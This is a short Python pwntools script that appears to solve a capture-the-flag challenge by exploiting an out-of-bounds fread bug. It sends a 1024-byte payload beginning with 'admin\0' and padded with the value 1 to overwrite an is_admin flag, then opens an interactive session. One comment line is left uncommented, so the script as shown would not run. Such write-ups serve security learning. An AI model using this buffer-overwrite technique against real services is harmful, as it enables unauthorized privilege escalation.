#!/usr/bin/env python3
from pwn import *

context.update(arch="amd64", timeout=0.5)

p = remote("ctf.example.org", 4203)

# there is a bug in fread, it reads out of bounds:
sizeof(buf) * BUF_LEN == 32 * 32 == 1024
#
# So payload MUST be 1024 len, and must start with 'admin\0',
# and somewhere we need to overwrite is_admin to 1 (\x01\x00\x00\x00).
# So i build a messy 1024 payload repeating 0x00000001, then replace
# first bytes with 'admin\0':
payload = flat(
    {
        0: b"admin\0",
    },
    length=1024,
    filler=p32(1),
)

log.info(f"payload len = {len(payload)}")
log.hexdump(payload)

p.send(payload)
p.interactive()
